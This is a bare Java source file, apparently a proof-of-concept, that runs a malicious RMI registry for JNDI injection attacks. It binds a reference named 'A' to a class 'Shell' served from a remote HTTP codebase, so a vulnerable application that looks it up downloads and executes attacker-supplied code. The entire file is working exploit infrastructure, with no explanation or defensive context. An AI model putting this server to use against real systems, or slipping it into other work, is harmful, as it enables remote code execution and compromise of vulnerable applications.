package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


public class Server{
    public static void main(String[] arg){
        try {
            Registry registry = LocateRegistry.createRegistry(8888);
            Reference reference = new Reference("Shell","Shell","http://127.0.0.1:9999/");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("A",referenceWrapper);
            System.out.println("RMI object bound");
        } catch (Exception e){
            System.err.println("Server exception: " + e.toString());
            e.printStackTrace();
        }
    }
}
